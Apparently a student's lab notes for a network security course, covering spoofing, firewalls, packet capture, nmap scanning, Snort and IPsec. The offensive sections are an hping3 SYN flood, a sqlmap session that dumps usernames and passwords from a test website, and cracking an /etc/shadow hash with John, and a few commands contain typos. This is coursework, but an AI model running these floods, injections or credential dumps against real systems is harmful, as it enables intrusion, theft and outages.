# TestDL
Setting up git

ubuntu exp1:
IP SPOOFING:
if netkit not installed , download all 3 files from https://www.netkit.org/

tar -xjf netkit-2.8.tar.bz2
tar -xjf netkit-filesystem-i386-F5.2.tar.bz2
tar -xjf netkit-kernel-i386-K2.8.tar.bz2

export NETKIT_HOME=/home/apsit/netkit 
export MANPATH=:$NETKIT_HOME/man
export PATH=$NETKIT_HOME/bin:$PATH

cd netkit
./check_configuration.sh
sudo apt-get install lib32z1
./check_configuration.sh

sudo apt -y install xterm
./check_configuration.sh

vstart pc1 -eth0=A
vstart pc2 -eth0=A 
vstart pc3 -eth0=A

PC1:

1. ifconfig eth0 192.168.1.11
4. iptables -t nat -A POSTROUTING -i icmp -j SNAT --to-source 192.168.1.12
7. ping 192.168.1.13




PC2:

2. ifconfig eth0 192.168.1.12
5. tcpdump -i any icmp




PC3:
 
3. ifconfig eth0 192.168.1.13
6. tcpdump -i any icmp

MAC SPOOFING:

sudo apt-get install arpwatch
service arpwatch restart 
service arpwatch status

m1(attacker)(192.168.x.1):
ping 192.168.x.2
ifconfig enp1s0 hw ether 00:1a:ff:0a:e7:1b
ifconfig
ping 192.168.x.2

m2(192.168.x.2):
ping 192.168.x.1
tail -f /var/log/syslog









centos EXP2 2 person: SQUID


#sudo yum -y install squid
#service squid restart
#service squid status

#sudo yum -y install httpd
#service httpd restart
#service httpd status

#netstat -atnl | grep :80                                    //check whther http port is in listen state or not
#ifconfig                                                    //know the ip of your pc 192.168.x.x

#gedit /etc/hosts

	enter <192.168.x.x paresh.apsit.com>

go to firefox alt+e > preference > search manual > add manual proxy to your system ip at port 3128




search paresh.apsit.com #access should be allowed and apache page should be displayed
	

simultaneously in 2nd terminal run 
# tail -f /var/log/squid/access.log
a tcp_miss should be present in log to paresh.apsit.com


gedit /etc/squid/squid.conf

	acl blocked_domains dstdomain .paresh.apsit.com
		after acl of ports
	http_access deny blocked_domains
		after http_acess deny manager

save and restart squid 
#service squid restart
#tail -f /var/log/squid/access.log
search paresh.apsit.com and access should be denied and tcp_denied should be there in log


EXP3a 2 person :

iptables -F
iptables -L
iptables -P INPUT DROP
iptables -P OUTPUT DROP

HOST1:

iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

iptables -A OUTPUT -p tcp --sport 80 -m conntrack --ctstate ESTABLISHED -j ACCEPT

iptables -A INPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT

iptables -A OUTPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

ssh root@host2ip

HOST2:

iptables -A INPUT -p tcp --sport 80 -m conntrack --ctstate ESTABLISHED -j ACCEPT

iptables -A OUTPUT -p tcp --dport 80 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

iptables -A OUTPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT

search host1 ip on browser



EXP3b:
iptables -F
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT

netstat -atnl | grep :80

t1. tcpdump -i enp4s0 -n -xX port 80

t2. netstat -atnl -c | grep :80

tcpdump -D : display all available interfaces
tcpdump -i wlo1 : capture traffic at the interface “wlo1”
tcpdump -i any : capture traffic at any interface
tcpdump -i wlo1 port 80 : capture traffic at the interface “wlo1” on port 80
tcpdump -i wlo1 -c 5 : capture 5 packets at the interface “wlo1”
tcpdump -i wlo1 tcp : capture only tcp traffic at interface “wlo1”
tcpdump -i wlo1 src 192.168.43.169: capture traffic at interface “wlo1” with source IP 192.168.43.169 



wireshark:
 dns
 ip.addr==192.168.1.2
 ip.src==192.168.1.2
 ip.dst==192.168.1.2
 ip.addr==192.168.1.0/24
 !ip.addr==192.168.1.2
 eth.addr == 00:60:e0:53:13:d5
 tcp.port==80
 tcp.srcport==80
 tcp.dstport==80
 tcp.flags.syn == 1 and tcp.flags.ack == 0









centos EXP4 :

sudo yum -y install nmap 


WITHOUT FIREWALL:
iptables -F
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
service httpd restart
nmap 192.168.11.1
tcpdump -i enp4s0 -n port 80 -> nmap -sT 192.168.11.1 
tcpdump -i enp4s0 -n port 80 -> nmap -sV 192.168.11.1
tcpdump -i enp4s0 -n port 80 -> nmap -O 192.168.11.1
tcpdump -i lo -n port 80 -> nmap -sT 127.0.0.1 -p 80	//tcp coonnect full scan
tcpdump -i lo -n port 80 -> nmap -sS 127.0.0.1 -p 80    //tcp syn half scan
tcpdump -i lo -n port 80 -> nmap -sF 127.0.0.1 -p 80	//fin scan
tcpdump -i lo -n port 80 -> nmap -sP 127.0.0.1 -p 80	//PING SCAN
tcpdump -i lo -n port 80 -> nmap -sN 127.0.0.1 -p 80	//NULL SCAN				NOTE: LOCALHOST IP USE KIA ISILIYE lo port scan kia 
	agar dusra ip use karoge toh enp4s0 port scan karo instead lo	

with firewall:
iptables -A INPUT -j DROP 
iptables -A OUTPUT -j DROP
iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW,ESTABLISED -j ACCEPT
iptables -A OUTPUT -p tcp --sport 80 -m conntrack --ctstate ESTABLISED -j ACCEPT
service httpd stop

tcpdump -i enp4s0 -n port 80 -> nmap -sT 192.168.11.1 
tcpdump -i lo -n port 80 -> nmap -sT 127.0.0.1 -p 80
tcpdump -i lo -n port 80 -> nmap -sS 127.0.0.1 -p 80
tcpdump -i lo -n port 80 -> nmap -sF 127.0.0.1 -p 80
tcpdump -i lo -n port 80 -> nmap -sP 127.0.0.1 -p 80

nmap 192.168.11.1
tcpdump -i enp4s0 -n port 80 -> nmap -sT 192.168.11.1 
tcpdump -i enp4s0 -n port 80 -> nmap -sV 192.168.11.1
tcpdump -i enp4s0 -n port 80 -> nmap -O 192.168.11.1
tcpdump -i lo -n port 80 -> nmap -sT 127.0.0.1 -p 80	//tcp coonnect full scan
tcpdump -i lo -n port 80 -> nmap -sS 127.0.0.1 -p 80    //tcp syn half scan
tcpdump -i lo -n port 80 -> nmap -sF 127.0.0.1 -p 80	//fin scan
tcpdump -i lo -n port 80 -> nmap -sP 127.0.0.1 -p 80	//PING SCAN
tcpdump -i lo -n port 80 -> nmap -sN 127.0.0.1 -p 80	//NULL SCAN				NOTE: LOCALHOST IP USE KIA ISILIYE lo port scan kia 
	agar dusra ip use karoge toh enp4s0 port scan karo instead lo


centos EXP5 HPING -2 person :

Without firewall

iptables -F
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT

nmap -sT 192.168.1.11 //scan victim pc to attcak whther its active or not

hping3 -S --flood --rand-source -p 80 192.168.1.11    ->  netstat -atnl -c | grep :80 , tcpdump -i any -n port 80

-1 : ICMP mode

-2 : UDP mode

-a : Fake Hostname

-p : Destination port

-S : Set the SYN flag

take ss of tcpdump, hping, system moniter graph displaying the usage of cpu,network during dos


WITH FIREWALL:
iptables -P INPUT  DROP 
iptables -P OUTPUT  DROP
iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW,ESTABLISED -j ACCEPT
iptables -A OUTPUT -p tcp --sport 80 -m conntrack --ctstate ESTABLISED -j ACCEPT

hping3 -S --flood --rand-source -p 80 192.168.1.11    ->  netstat -atnl -c | grep :80 , tcpdump -i any -n port 80




UBUNTU EXP6 SNORT ids 2person:

snort --version
service snort status

cd /etc/snort
ls
cd rules
ls
ls -l | grep myrules.rules
vim myrules.rules
	alert tcp 192.168.0.0/16 any -> any 20171 (msg:"outgoing ssh connection"; flags:S; sid :10000;) 
	alert icmp any any -> any any (msg:"We are been pingged"; sid :10002; rev:1;)

cd ..
vim snort.conf
	#include /etc/snort/rules/icmp.rules
	#include /etc/snort/rules/telnet.rules
	include /etc/snort/rules/myrules.rules

ping self ip or other

tail -f /var/log/snort/alert

cd /var/log/snort

ls -l




LOGGER MODE:
sudo snort -l /var/log/snort/ -b -h <ip self or others ip>

ls -l /var/log/snort






IDS MODE:
snort -d -l /var/log/snort/ -c /etc/snort/snort.conf -i enp4s0

ls -l /var/log/snort/

			OR

sudo snort -A console -c /etc/snort/snort.conf  -> ping selfip



ls -l /var/log/snort


sudo tcpdump -r snort.log.651621561         //file name will be different


EXP7 KALI LINUX: OMIT

EXP8 SQL INJECTION:

sudo apt-get install sqlmap
sqlmap -h

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C uname --dump
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C pass --dump


now visit website and enter obtained name and pass to login


EXP9 ipsec 2person:
OPEN FEDORA IN VM ON BOTH PC 

system-config-network
service network restart

go to device select first device and click edit at top then 
	select statically set ip addresses:
	ADD IP OF your 192.168.7.46  and similary for pc2 192.168.7.47
	SUBNET 255.255.0.0
	THEN OK

go to ipsec click add at top 
	enter name same for both pc as kbd(u set any name of ur choice)
	auto encrpyt
	host2host
	add simple key 123456
	remote ip = 192.168.7.47 and in 2nd pc 192.168.7.46
	apply

file->save-
deactivate->activate
file->save
close ipsec

system network restart

pc1:
ping 192.168.7.47

pc2:
sudo tcpdump -i any -n -XX host 192.168.46



CRYPTOOL WALE SABHI EXP khud se kar


EXP11 JOHN rippler

sudo apt-get install john
sudo adduser paresh

note: create a very basic password like 12 or 123456 while creating user
else john will take months to crack password

sudo cat /etc/shadow
	copy last hash

vim t1.txt 
	paste the hash

cat t1.txt
	content will get displayed

john t1.txt

john -show t1.txt

